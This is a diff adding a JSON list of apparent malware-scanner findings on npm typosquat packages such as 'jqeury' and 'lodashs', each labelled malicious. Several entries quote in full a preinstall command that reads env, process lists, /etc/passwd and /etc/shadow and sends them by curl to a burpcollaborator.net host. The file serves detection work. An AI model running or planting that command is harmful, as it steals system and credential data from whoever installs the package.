@@ -1,0 +1,412 @@
+[
+  {
+    "package": "angluar-cli",
+    "version": "0.0.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in postinstall: \"node post.js\"."
+  },
+  {
+    "package": "colour-string",
+    "version": "1.5.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./adamantoblast.js\"."
+  },
+  {
+    "package": "colro-name",
+    "version": "9.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./chlorella.js\"."
+  },
+  {
+    "package": "com.google.play.comon",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-com.google.play.comon-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-com.google.play.comon-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "com.google.play.comon",
+    "version": "2.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-com.google.play.comon-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-com.google.play.comon-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "com.google.play.comon",
+    "version": "3.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-com.google.play.comon-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-com.google.play.comon-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "conventional-changelog",
+    "version": "1.2.0",
+    "label": "malicious",
+    "query": "obfuscated-payload-detonation",
+    "file": "index.js",
+    "startLine": 5,
+    "endLine": 10,
+    "message": "Malicious execution of data from $@.\"cm0gLX ... wgJg==\"this source"
+  },
+  {
+    "package": "electorn",
+    "version": "10.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 17,
+    "message": "Potentially malicious install script in preinstall: \"node update.js &\"."
+  },
+  {
+    "package": "elm-combine",
+    "version": "0.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "elm-combine",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "elm-combine",
+    "version": "2.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "elm-combine",
+    "version": "3.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in preinstall: \"export HOSTNAME && BCNET=\"linux-elm-combine-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"; ping -c 1 $BCNET; for i in env \"ps aux\" \"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\" \"cat /etc/hosts /etc/passwd /etc/shadow\"; do curl https://$BCNET -ski -m 30 -d \"$($i 2>&1|base64 -w0)\"; done || ping -n 1 windows-elm-combine-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true\"."
+  },
+  {
+    "package": "foever",
+    "version": "0.15.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./test/fixtures/otidia.js\"."
+  },
+  {
+    "package": "froever",
+    "version": "2.3.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/timeservingness.js\"."
+  },
+  {
+    "package": "jqeury",
+    "version": "3.3.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./src/data/var/everted.js\"."
+  },
+  {
+    "package": "jquerry",
+    "version": "2.0.0",
+    "label": "malicious",
+    "query": "obfuscated-payload-detonation",
+    "file": "index.js",
+    "startLine": 5,
+    "endLine": 10,
+    "message": "Malicious execution of data from $@.\"cm0gLX ... wgJg==\"this source"
+  },
+  {
+    "package": "jquerz",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/didactical.js\"."
+  },
+  {
+    "package": "loadyaml",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in preinstall: \"node update.js &\"."
+  },
+  {
+    "package": "loadyml",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in preinstall: \"node update.js\"."
+  },
+  {
+    "package": "lodashs",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in preinstall: \"node update.js && npm install electron\"."
+  },
+  {
+    "package": "logsymbles",
+    "version": "2.2.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./unknowably.js\"."
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 17,
+    "message": "Potentially malicious install script in preinstall: \"node script/prei.js\"."
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "script/prei.js",
+    "startLine": 9,
+    "endLine": 16,
+    "message": "Source path './preinstall.js' flows into sensitive operation"
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "script/prei.js",
+    "startLine": 10,
+    "endLine": 16,
+    "message": "Source path p flows into sensitive operation"
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "script/prei.js",
+    "startLine": 16,
+    "endLine": 16,
+    "message": "Source path node  flows into sensitive operation"
+  },
+  {
+    "package": "m-backdoor",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 17,
+    "message": "Potentially malicious install script in preinstall: \"node script/prei.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "noblox.js-proxy",
+    "version": "1.0.5",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 82,
+    "message": "Potentially malicious install script in postinstall: \"node postinstall.js\"."
+  },
+  {
+    "package": "pegleg_heart",
+    "version": "0.0.12",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in postinstall: \"chmod +x post_install.sh && ./post_install.sh\"."
+  },
+  {
+    "package": "pegleg_heart",
+    "version": "0.0.6",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 12,
+    "message": "Potentially malicious install script in postinstall: \"chmod +x post_install.sh && ./post_install.sh\"."
+  },
+  {
+    "package": "pm-controls",
+    "version": "1.1.8",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": "dist/vendor.bundle.js",
+    "startLine": 1,
+    "endLine": 175746,
+    "message": "Credential harvesting and exfiltration pattern detected: Account takeover pattern: password + email modification + DELETE sequence detected in same file"
+  },
+  {
+    "package": "regenraotr",
+    "version": "6.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./windpipe.js\"."
+  },
+  {
+    "package": "regenrator",
+    "version": "6.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./prebends.js\"."
+  },
+  {
+    "package": "require-ports",
+    "version": "10.4.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./leukocytic.js\"."
+  },
+  {
+    "package": "soket.io",
+    "version": "2.1.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/devenustate.js\"."
+  },
+  {
+    "package": "soket.js",
+    "version": "1.9.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./hastile.js\"."
+  },
+  {
+    "package": "tensorplow",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 21,
+    "message": "Potentially malicious install script in preinstall: \"sh build.sh &\"."
+  },
+  {
+    "package": "uglyfi-js",
+    "version": "3.4.6",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/coprophagan.js\"."
+  },
+  {
+    "package": "yeoman-genrator",
+    "version": "3.1.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./nonpsychologic.js\"."
+  }
+]
